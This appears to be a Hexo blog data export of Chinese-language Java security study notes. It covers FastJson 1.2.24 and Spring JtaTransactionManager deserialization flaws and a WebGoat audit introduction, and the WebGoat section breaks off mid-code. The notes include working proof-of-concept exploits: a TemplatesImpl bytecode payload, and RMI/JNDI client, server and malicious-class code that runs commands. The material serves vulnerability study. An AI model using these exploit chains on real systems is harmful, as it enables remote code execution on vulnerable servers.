{"meta":{"title":"glotozz'blog","subtitle":null,"description":null,"author":"glotozz","url":"https://glotozz.github.io","root":"/"},"pages":[{"title":"文章收集","date":"2019-09-04T14:16:42.000Z","updated":"2020-03-01T12:51:25.497Z","comments":true,"path":"read/index.html","permalink":"https://glotozz.github.io/read/index.html","excerpt":"","text":"3/1 Fastjson反序列化漏洞利用分析 [fastjson 远程反序列化poc的构造和分析](http://xxlegend.com/2017/05/03/title- fastjson 远程反序列化poc的构造和分析/) FastJson最新反序列化漏洞分析 2/29 Java反序列化漏洞从入门到深入 Spring framework deserialization RCE漏洞分析以及利用 Jndi注入及Spring RCE漏洞分析 2/28 从零开始java代码审计系列(一) Java代码审计入门篇：WebGoat 8 2/27 SVG XSS的一个黑魔法 深入理解浏览器解析机制和XSS向量编码 CSP策略及绕过方法 2020年仍然有效的一些XSS Payload 2/26 LD_PRELOAD+putenv bypass 跨域方式及其产生的安全问题 Python3编码问题 CRLF注入漏洞"},{"title":"关于我","date":"2019-09-04T14:16:42.000Z","updated":"2020-02-21T07:27:16.016Z","comments":true,"path":"about/index.html","permalink":"https://glotozz.github.io/about/index.html","excerpt":"","text":""}],"posts":[{"title":"FastJson1.2.24反序列化漏洞","slug":"FastJson反序列化漏洞","date":"2020-03-01T05:47:37.000Z","updated":"2020-03-01T12:58:27.895Z","comments":true,"path":"2020/03/01/FastJson反序列化漏洞/","link":"","permalink":"https://glotozz.github.io/2020/03/01/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"反序列化漏洞也是Java反序列化漏洞中比较经典的漏洞","text":"反序列化漏洞也是Java反序列化漏洞中比较经典的漏洞 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 FastJson介绍 参考链接： FastJson介绍下载 12345678910111213141516171819&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt; &lt;groupId&gt;fastjson1224&lt;&#x2F;groupId&gt; &lt;artifactId&gt;test&lt;&#x2F;artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;&#x2F;version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt; &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt; &lt;version&gt;1.2.24&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;&#x2F;dependencies&gt;&lt;&#x2F;project&gt; 序列化 1234567891011121314151617import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.serializer.SerializerFeature;public class FJTest &#123; public static void main(String[] args) &#123; Cat cat &#x3D; new Cat(); cat.setName(&quot;gqy&quot;); &#x2F;&#x2F;序列化 String json &#x3D; JSON.toJSONString(cat); System.out.println(json); &#x2F;&#x2F;设置SerializerFeature.WriteClassName可写入类名 String json1 &#x3D; JSON.toJSONString(cat, SerializerFeature.WriteClassName); System.out.println(json1); &#x2F;&#x2F;反序列化 System.out.println(JSON.parseObject(json1, Cat.class).getName()); &#125;&#125; 注释掉setName()和setAge() 12345String s &#x3D; &quot;&#123;\\&quot;@type\\&quot;:\\&quot;Cat\\&quot;,\\&quot;name\\&quot;:\\&quot;gqy\\&quot;&#125;&quot;;Cat cat1 &#x3D; JSON.parseObject(s, Cat.class);System.out.println(cat1.getName()); &#x2F;&#x2F;nullCat cat2 &#x3D; JSON.parseObject(s, Cat.class, Feature.SupportNonPublicField);System.out.println(cat2.getName()); &#x2F;&#x2F;gqy 设置Feature.SupportNonPublicField即可支持对象类的private属性 新加一个属性properties,跟踪反序列化 12345678910111213141516171819202122232425import java.util.Properties;public class Cat &#123; private String name; private String age; private Properties properties; public String getName() &#123; return name; &#125; public Properties getProperties() &#123; System.out.println(&quot;getProperties&quot;); return properties; &#125; public String getAge() &#123; System.out.println(&quot;getAge&quot;); return age; &#125; public Cat() &#123; &#125;&#125; 12String s1 &#x3D; &quot;&#123;\\&quot;@type\\&quot;:\\&quot;Cat\\&quot;,\\&quot;name\\&quot;:\\&quot;gqy\\&quot;,\\&quot;properties\\&quot;:&#123;&#125;&#125;&quot;;Cat cat3 &#x3D; JSON.parseObject(s1, Cat.class, Feature.SupportNonPublicField); 结果为 12构造函数getProperties 漏洞触发点为 com.sun.org.apache.xalan.internal.xsltc.trax.Templates，但是这个包我在fastjson中没找到，却可以执行。 可以借助下面的网址查找jar https://www.findjar.com/ 在我jdk1.8.0._112的jre/lib/rt.jar中，也添加到libraries中即可 搜索getOutputProperties() 追踪Transformer 追踪getTransletInstance() 这里有一个实例化类，追踪defineTransletClasses() 从_bytecodes属性中加载类对象，并且上一步中要求这个对象继承AbstractTranslet 追踪ABSTRACT_TRANSLET常量为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet和前面的强制类转化相照应 利用链 1234567891011JSON.parseObject...JavaBeanDeserializer.deserialze...FieldDeserializer.setValue...TemplatesImpl.getOutputPropertiesTemplatesImpl.newTransformerTemplatesImpl.getTransletInstance...Runtime.getRuntime().exec 构造我们需要的实例化对象 newInstance()会自动执行无参构造方法 123456789101112131415161718import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class Test extends AbstractTranslet &#123; public Test()&#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; &#x2F;&#x2F;继承AbstractTranslet需要重写下面两个方法 public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException &#123; &#125; public void transform(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler) throws TransletException &#123; &#125;&#125; fastjson-remote-code-execute-poc 还有需要注意的一点，不能将类对象以字符流的形式传入，在JSONScanner中存在base64解码 POC 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package person;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.io.IOUtils;import org.apache.commons.codec.binary.Base64;import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.IOException;&#x2F;** * Created by web on 2017&#x2F;4&#x2F;29. *&#x2F;public class Poc &#123; public static String readClass(String cls)&#123; ByteArrayOutputStream bos &#x3D; new ByteArrayOutputStream(); try &#123; IOUtils.copy(new FileInputStream(new File(cls)), bos); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return Base64.encodeBase64String(bos.toByteArray()); &#125; public static void test_autoTypeDeny() throws Exception &#123; ParserConfig config &#x3D; new ParserConfig(); final String fileSeparator &#x3D; System.getProperty(&quot;file.separator&quot;); final String evilClassPath &#x3D; System.getProperty(&quot;user.dir&quot;) + &quot;\\\\target\\\\classes\\\\person\\\\Test.class&quot;; String evilCode &#x3D; readClass(evilClassPath); final String NASTY_CLASS &#x3D; &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;; String text1 &#x3D; &quot;&#123;\\&quot;@type\\&quot;:\\&quot;&quot; + NASTY_CLASS + &quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+evilCode+&quot;\\&quot;],&quot; + &quot;&#39;_name&#39;:&#39;a.b&#39;,&quot; + &quot;&#39;_tfactory&#39;:&#123; &#125;,&quot; + &quot;\\&quot;_outputProperties\\&quot;:&#123; &#125;&#125;\\n&quot;; System.out.println(text1); &#x2F;&#x2F;String personStr &#x3D; &quot;&#123;&#39;name&#39;:&quot;+text1+&quot;,&#39;age&#39;:19&#125;&quot;; &#x2F;&#x2F;Person obj &#x3D; JSON.parseObject(personStr, Person.class, config, Feature.SupportNonPublicField); Object obj &#x3D; JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); &#x2F;&#x2F;assertEquals(Model.class, obj.getClass()); &#125; public static void main(String args[])&#123; try &#123; test_autoTypeDeny(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 总结 上面其实只是fastjson反序列化的一种利用方式，还有基于JDNI（设置lookup属性）、基于ClassLoader（ 构造className为一个特殊的字符串时，通过这个类加载器来实现对自定义类的加载 ）的利用方式。 支持jdk1.7，1.8 该poc只能运行在fastjson-1.2.22到fastjson-1.2.24版本区间，因为fastjson从1.2.22版本才开始引入SupportNonPublicField。 不过此种利用方式需要在解析json串时设置Feature.SupportNonPublicField，而业务通常在使用fastjson时往往会直接按照默认参数调用parseObject()方法，所以略为鸡肋。 参考链接： [http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/](http://xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/)","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"FastJson1.2.24反序列化漏洞","slug":"FastJson1.2.24反序列化漏洞","date":"2020-03-01T05:47:37.000Z","updated":"2020-03-01T05:57:46.871Z","comments":true,"path":"2020/03/01/FastJson1.2.24反序列化漏洞/","link":"","permalink":"https://glotozz.github.io/2020/03/01/FastJson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"反序列化漏洞也是Java反序列化漏洞中比较经典的漏洞","text":"反序列化漏洞也是Java反序列化漏洞中比较经典的漏洞 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 1.2.22&lt;=fastjson&lt;=1.24爆出一个","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Java反序列化漏洞学习","slug":"Java反序列化漏洞学习","date":"2020-02-29T01:38:56.000Z","updated":"2020-03-01T05:41:03.825Z","comments":true,"path":"2020/02/29/Java反序列化漏洞学习/","link":"","permalink":"https://glotozz.github.io/2020/02/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/","excerpt":"主要通过spring中的反序列化漏洞和FastJson反序列化漏洞学习java反序列化原理及利用","text":"主要通过spring中的反序列化漏洞和FastJson反序列化漏洞学习java反序列化原理及利用 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 基础知识 Spring反序列化漏洞 参考链接： 基础知识*为什么会有序列化和反序列化? * 利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。 序列化需要满足的两个条件 该类必须实现java.io.Serializable接口。 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。 反序列化代码举例 1234567891011121314151617181920212223242526272829303132333435import java.io.*;public class SerializeTest &#123; public static void main(String[] args) &#123; Test test &#x3D; new Test(); test.name &#x3D; &quot;gqy&quot;; test.age &#x3D; &quot;18&quot;; try&#123; &#x2F;&#x2F; 打开一个文件输入流 FileOutputStream fileOut &#x3D; new FileOutputStream(&quot;F:\\\\IdeaProjects\\\\javadeserialization\\\\src\\\\test1.db&quot;); &#x2F;&#x2F; 建立对象输入流 ObjectOutputStream out &#x3D; new ObjectOutputStream(fileOut); &#x2F;&#x2F;输出反序列化对象 out.writeObject(test); out.close(); fileOut.close(); System.out.println(&quot;Serialized data is saved!!&quot;); &#x2F;&#x2F;反序列化提取对象 FileInputStream fileIn &#x3D; new FileInputStream(&quot;F:\\\\IdeaProjects\\\\javadeserialization\\\\src\\\\test1.db&quot;); &#x2F;&#x2F; 建立对象输入流 ObjectInputStream in &#x3D; new ObjectInputStream(fileIn); &#x2F;&#x2F; 读取对象 Test test1 &#x3D; null; test1 &#x3D; (Test) in.readObject(); in.close(); fileIn.close(); System.out.println(test1.name); test1.eat(); &#125;catch (IOException | ClassNotFoundException i)&#123; i.printStackTrace(); &#125; &#125;&#125; 查看下序列化后的数据，只能看到不完整的信息 反序列化漏洞demo 在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。 PS：有时也会使用readUnshared()方法来读取对象，readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。 1234567891011121314151617181920212223242526272829303132import java.io.*;public class test&#123; public static void main(String args[]) throws Exception&#123; UnsafeClass Unsafe &#x3D; new UnsafeClass(); Unsafe.name &#x3D; &quot;hacked by ph0rse&quot;; FileOutputStream fos &#x3D; new FileOutputStream(&quot;object&quot;); ObjectOutputStream os &#x3D; new ObjectOutputStream(fos); &#x2F;&#x2F;writeObject()方法将Unsafe对象写入object文件 os.writeObject(Unsafe); os.close(); &#x2F;&#x2F;从文件中反序列化obj对象 FileInputStream fis &#x3D; new FileInputStream(&quot;object&quot;); ObjectInputStream ois &#x3D; new ObjectInputStream(fis); &#x2F;&#x2F;恢复对象 UnsafeClass objectFromDisk &#x3D; (UnsafeClass)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); &#125;&#125;class UnsafeClass implements Serializable&#123; public String name; &#x2F;&#x2F;重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; &#x2F;&#x2F;执行默认的readObject()方法 in.defaultReadObject(); &#x2F;&#x2F;执行命令 Runtime.getRuntime().exec(&quot;calc.exe&quot;); &#125;&#125; 主要是这里的重写了readObject() 漏洞起源 重写ObjectInputStream对象的resolveClass方法中的检测可被绕过。 使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。因此，如果在审计过程中发现了采用黑名单进行过滤的代码，多半存在一两个‘漏网之鱼’可以利用。并且采取黑名单方式仅仅可能保证此刻的安全，若在后期添加了新的功能，就可能引入了新的漏洞利用方式。所以仅靠黑名单是无法保证序列化过程的安全的。 基础库中隐藏的反序列化漏洞 2015年由黑客Gabriel Lawrence和Chris Frohoff发现的‘Apache Commons Collections’类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。存在危险的基础库： 123456789101112commons-fileupload 1.3.1commons-io 2.4commons-collections 3.1commons-logging 1.2commons-beanutils 1.9.2org.slf4j:slf4j-api 1.7.21com.mchange:mchange-commons-java 0.2.11org.apache.commons:commons-collections 4.0com.mchange:c3p0 0.9.5.2org.beanshell:bsh 2.0b5org.codehaus.groovy:groovy 2.3.9org.springframework:spring-aop 4.1.4.RELEASE Spring反序列化漏洞首先需要了解JAVA体系中的RMI以及JNDI RMI（Remote Method Invocation） 即Java远程方法调用，一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为JRMP（Java Remote Message Protocol，Java远程消息交换协议）以及CORBA。 JNDI (Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。JNDI支持的服务主要有以下几种：DNS、LDAP、 CORBA对象服务、RMI等。 简单说就是RMI注册的服务可以让JNDI应用程序来访问。 JNDI RCE漏洞产生的原因就在于当我们在注册RMI服务时，可以指定codebase url，也就是远程要加载类的位置，设置该属性可以让JDNI应用程序在加载时加载我们指定的类 ( 例如：http://www.iswin.org/xx.class) ，这里还有一个比较重要的点，也是触发恶意代码的点，当JNDI应用程序通过lookup(rmi服务的地址)调用指定codebase url上的类后，会调用被远程调用类的构造方法，所以如果我们将恶意代码放在被远程调用类的构造方法中时，漏洞就会触发。 RMI测试demo 1234567Registry registry &#x3D; LocateRegistry.createRegistry(1999);&#x2F;&#x2F; 设置code url 这里即为http:&#x2F;&#x2F;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;&#x2F;&#x2F; 最终下载恶意类的地址为http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;ExportObject.classReference reference &#x3D; new Reference(&quot;ExportObject&quot;, &quot;ExportObject&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;&quot;);&#x2F;&#x2F; Reference包装类ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference);registry.bind(&quot;Object&quot;, referenceWrapper); 1999端口注册了RMI服务，设置code url为http://http://127.0.0.1:8000/，实际类加载位置为http://127.0.0.1:8000/ExportObject.class，绑定了Object，JNDI调用的地址为http://127.0.0.1:8000/Object 控制了恶意类ExportObject就能RCE JNDI测试demo Persion类 1234567891011121314151617181920212223242526272829303132333435363738import java.io.IOException;import java.io.Serializable;import java.rmi.Remote;public class Person implements Remote,Serializable &#123; private static final long serialVersionUID &#x3D; 1L; private String name; private String password; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name &#x3D; name; &#125; public String getPassword() &#123; return password; &#125; public void setPassword(String password) &#123; this.password &#x3D; password; &#125; public String toString()&#123; return &quot;name:&quot;+name+&quot; password:&quot;+password; &#125; private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; &#x2F;&#x2F;执行默认的readObject()方法 in.defaultReadObject(); &#x2F;&#x2F;执行命令 Runtime.getRuntime().exec(&quot;calc.exe&quot;); &#125;&#125; 服务端rmi为例 1234567891011121314151617181920212223242526272829303132333435363738import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;public class Test3 &#123; public static void initPerson() throws Exception&#123; &#x2F;&#x2F;配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常 &#x2F;&#x2F;配置rmi LocateRegistry.createRegistry(3001); System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); System.setProperty(Context.PROVIDER_URL, &quot;rmi:&#x2F;&#x2F;localhost:3001&quot;); &#x2F;&#x2F;&#x2F;&#x2F;初始化 InitialContext ctx &#x3D; new InitialContext(); &#x2F;&#x2F;实例化person对象 Person p &#x3D; new Person(); p.setName(&quot;hello&quot;); p.setPassword(&quot;jndi&quot;); &#x2F;&#x2F;person对象绑定到JNDI服务中，JNDI的名字叫做：person。 ctx.bind(&quot;person&quot;, p); ctx.close(); &#125; public static void findPerson() throws Exception&#123; &#x2F;&#x2F;因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了 InitialContext ctx &#x3D; new InitialContext(); &#x2F;&#x2F;通过lookup查找person对象 Person person &#x3D; (Person) ctx.lookup(&quot;person&quot;); &#x2F;&#x2F;打印出这个对象 System.out.println(person.toString()); ctx.close(); &#125; public static void main(String[] args) throws Exception &#123; initPerson(); findPerson(); &#125;&#125; 本来是读取person类的信息，在person类中加上了readObject()方法，成功RCE Jndi注入产生的原因 1、lookup参数可控。 2、InitialContext类及他的子类的lookup方法允许动态协议转换 3、lookup查找的对象是Reference类型及其子类 4、当远程调用类的时候默认会在rmi服务器中的classpath中查找，如果不存在就会去url地址去加载类。如果都加载不到就会失败。 跟进lookup() 跟进getURLOrDefaultInitCtx(name) 即使一开始设置了Context，也是可以重写为我们传入的lookup()的参数 举例 12345678&#x2F;&#x2F; Create the initial contextHashtable env &#x3D; new Hashtable();env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);env.put(Context.PROVIDER_URL, &quot;rmi:&#x2F;&#x2F;secure-server:1099&quot;);Context ctx &#x3D; new InitialContext(env);&#x2F;&#x2F; Look up in the local RMI registryObject local_obj &#x3D; ctx.lookup(&lt;attacker controlled&gt;); Spring RCE Spring RCE形成的主要原因是 Spring框架的spring-tx-xxx.jar中的org.springframework.transaction.jta.JtaTransactionManager 存在一个readObject方法。当执行对象反序列化的时候，会执行lookup操作，导致了jndi注入，可以导致远程代码执行问题 环境搭建+POC mvn install出现报错[ERROR] 不再支持源选项 5。请使用 6 或更高版本。 pom.xml中增加maven编译的jdk版本设置 123456789&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt; &lt;version&gt;3.3&lt;&#x2F;version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;&#x2F;source&gt; &lt;target&gt;1.8&lt;&#x2F;target&gt; &lt;&#x2F;configuration&gt;&lt;&#x2F;plugin&gt; 发现还是没用,Terminal里面的java版本始终是java11 解决办法：help–&gt;find action ，输入switch boot jdk，切换成自己的jdk即可 把jar包下载下来，分析一下源码 利用idea自带的反编译，add as library，注意最好添加为Global，否则可能会找不到类 org.springframework.transaction.jta.JtaTransactionManager 当一个类被反序列化时会调用该类的readObject()方法，跟进initUserTransactionAndTransactionManager()方法 跟进lookupUserTransaction() 调用JndiTemplate.lookup()，追踪lookup() 跟进lookup() 总结一下调用链 JtaTransactionManager-&gt;readObject()-&gt;initUserTransactionAndTransactionManager() -&gt;lookupUserTransaction(this.userTransactionName)，这里的userTransactionName是我们可控的（setUserTransactionName()），最终触发 JndiTemplate的lookup(userTransactionName)触发RCE。我们需要注册一个rmi服务，并提供恶意类。 漏洞实现 客户端demo 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package client.src.main.java;import java.io.IOException;import java.io.ObjectOutputStream;import java.net.InetSocketAddress;import java.net.Socket;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import javax.naming.Reference;import org.springframework.transaction.jta.JtaTransactionManager;import com.sun.jndi.rmi.registry.ReferenceWrapper;import com.sun.net.httpserver.HttpServer;&#x2F;*** * * @author admin@iswin.org * @time 2016.1.24 *&#x2F;@SuppressWarnings(&quot;restriction&quot;)public class ExploitClient &#123; &#x2F;*** * 启动http服务器，提供下载远程要调用的类 * * @throws IOException *&#x2F; public static void lanuchCodebaseURLServer() throws IOException &#123; System.out.println(&quot;Starting HTTP server&quot;); HttpServer httpServer &#x3D; HttpServer.create(new InetSocketAddress(8000), 0); httpServer.createContext(&quot;&#x2F;&quot;, new HttpFileHandler()); httpServer.setExecutor(null); httpServer.start(); &#125; &#x2F;*** * 启动RMI服务 * * @throws Exception *&#x2F; public static void lanuchRMIregister() throws Exception &#123; System.out.println(&quot;Creating RMI Registry&quot;); Registry registry &#x3D; LocateRegistry.createRegistry(1999); &#x2F;&#x2F; 设置code url 这里即为http:&#x2F;&#x2F;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F; &#x2F;&#x2F; 最终下载恶意类的地址为http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;ExportObject.class Reference reference &#x3D; new Reference(&quot;ExportObject&quot;, &quot;ExportObject&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;&quot;); &#x2F;&#x2F; Reference包装类 ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference); registry.bind(&quot;Object&quot;, referenceWrapper); &#125; &#x2F;*** * 发送payload * * @throws Exception *&#x2F; public static void sendPayload() throws Exception &#123; &#x2F;&#x2F; jndi的调用地址 String jndiAddress &#x3D; &quot;rmi:&#x2F;&#x2F;127.0.0.1:1999&#x2F;Object&quot;; &#x2F;&#x2F; 实例化JtaTransactionManager对象，并且初始化UserTransactionName成员变量 JtaTransactionManager object &#x3D; new JtaTransactionManager(); object.setUserTransactionName(jndiAddress); &#x2F;&#x2F; 发送构造好的payload Socket socket &#x3D; new Socket(&quot;127.0.0.1&quot;, 9999); System.out.println(&quot;Sending object to server...&quot;); ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(socket.getOutputStream()); objectOutputStream.writeObject(object); objectOutputStream.flush(); socket.close(); &#125; public static void main(String[] args) throws Exception &#123; lanuchCodebaseURLServer(); lanuchRMIregister(); sendPayload(); &#125;&#125; 服务端 123456789101112131415161718192021222324252627package server.src.main.java;import java.io.*;import java.net.*;public class ExploitableServer &#123; public static void main(String[] args) &#123; try &#123; int port &#x3D; 9999; ServerSocket serverSocket &#x3D; new ServerSocket(port); System.out.println(&quot;Server started on port &quot;+serverSocket.getLocalPort()); while(true) &#123; Socket socket&#x3D;serverSocket.accept(); System.out.println(&quot;Connection received from &quot;+socket.getInetAddress()); ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(socket.getInputStream()); try &#123; Object object &#x3D; objectInputStream.readObject(); System.out.println(&quot;Read object &quot;+object); &#125; catch(Exception e) &#123; System.out.println(&quot;Exception caught while reading object&quot;); e.printStackTrace(); &#125; &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; payload 123456789101112131415import sun.awt.windows.ThemeReader;public class ExportObject &#123; public ExportObject() &#123; try &#123; while(true) &#123; System.out.println(&quot;running injected code...&quot;); Runtime.getRuntime().exec(&quot;calc.exe&quot;); Thread.sleep(1000); &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 切换java版本为1.8.0_112，成功 不过这只是模拟了漏洞的触发过程，客户端也就是攻击端，开个http服务8000，注册rmi服务到8000上，并绑定恶意类。然后开个socket服务发送payload到9999端口，这里的payload是就是将JtaTransactionManager反序列化，并设置object.setUserTransactionName(jndiAddress);。String jndiAddress = &quot;rmi://127.0.0.1:1999/Object&quot;;，实际查找位置为前面rmi绑定的http://127.0.0.1:8000/Object。 服务端就是开个socket服务从9999端口接受数据，并进行反序列化，自动触发readobject()，然后最终触发lookup()，jndi访问我们注册的rmi服务，触发恶意类的构造函数。 利用条件 1、存在接口进行序列化操作 2、访问对象可以出网 3、目标对象中的CLASSPATH存在Sping-tx-xxx.jar 总结 Spring-tx-xx.jar文件不是中间件的默认组件，所以，该漏洞就比较鸡肋 。 实际工程中可能会存在将缺陷jar文件放在中间件的类加载器中的情况， 即所有应用都可以访问这个jar，那么漏洞就可以利用 PS：本来想把Fastjson反序列化漏洞也写在这里的，但是防止篇幅过长，并写一篇🤦‍♂️ 参考链接： https://xz.aliyun.com/t/2041 https://www.freebuf.com/vuls/115849.html https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"java审计入门","slug":"java审计入门","date":"2020-02-28T00:48:22.000Z","updated":"2020-02-29T10:37:31.842Z","comments":true,"path":"2020/02/28/java审计入门/","link":"","permalink":"https://glotozz.github.io/2020/02/28/java%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/","excerpt":"开始学java🏃‍♀️","text":"开始学java🏃‍♀️ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 准备工作 WebGoat 8 开始审计 SqlInjection 参考链接： 一般面试都会问到java漏洞了解嘛，会分析🐴，但我一般都是利用现成工具或者exp。趁还没开学时间比较多，学习一下java代码审计。 准备工作安装 运行java程序：先编译a.java=&gt;a.class，因此.class结尾的字节码文件需要反编译，工具我一般用jadx java平台：java se，java ee，java me，主要学习第二个web服务 常见的java服务器： Tomcat、Weblogic、JBoss、GlassFish ，主要学习Tomcat Tomcat目录结构 Tomcat部署源码 javapms为例 以SpringMVC+Spring+Hibernate+Freemarker+Html5+jQuery为技术核心架构 IDEA 导入项目并添加tomcat配置 IDEA调试功能 当前项目结构不太懂，不知道如何下放断点，跳过 Maven-项目管理和构建工具 Maven是一种自动构建项目的方式，可以帮助我们自动从本地和远程仓库拉取关联jar包。 部署WebGoat为例，导入项目 完成之后background就开始下载，但是速度 Fortify 代码审计工具 暂时先也不用 WebGoat 8 WebGoat8是基于Spring boot框架开发,故意不安全的Web应用程序，旨在教授Web应用程序安全性课程。 需要的环境：java 11、Maven &gt; 3.2.1、IDEA 安装 1234git clone https:&#x2F;&#x2F;github.com&#x2F;WebGoat&#x2F;WebGoat.gitcd WebGoatmvn clean package -Dmaven.test.skip&#x3D;truemvn -pl webgoat-server spring-boot:run -Dmaven.test.skip&#x3D;true 因为我有个包下载失败了就跳过这个包 最后是如下的界面 import WebGoat到IDEA 进行代码查看及调试 发现已经配置好了 组件安全 也暂时跳过 Dependency-Check是OWASP（Open Web Application Security Project）的一个实用开源程序 。 项目地址以及参考教程 开始审计第一个页面是登录，登录是很容易存在漏洞的功能点之一。 没学过Spring boot框架，既然路由是/login，全局搜索login 找到org/owasp/webgoat/WebSecurityConfig.java 大致能看懂，但是漏洞看不出来==，先看下面这个类似认证的方法 查阅AuthenticationManagerBuilder auth ，允许轻松构建内存身份验证，LDAP身份验证，基于JDBC的身份验证，添加UserDetailsService以及添加AuthenticationProvider。 那么追踪userDetailsService 1private final UserService userDetailsService; 追踪UserService 和文章一样，userRepository.findByUsername(username)猜测是数据库查询， 追踪 是个接口，追踪 还是个接口，实现了更多方法，继续追踪，最后到Repository接口我也没找到实现这个接口的代码 这是个导入的包，看来已经高度集成，那么只需要知道其用法即可 [Spring Boot 揭秘与实战（二）] 实体对象 创建一个 Author 实体，真实的表名是 t_author，包含 id（自增主键）、 realName、 nickname 字段。 123456789101112131415@Entity@Table(name &#x3D; &quot;t_author&quot;)public class Author&#123; @Id @GeneratedValue(strategy &#x3D; 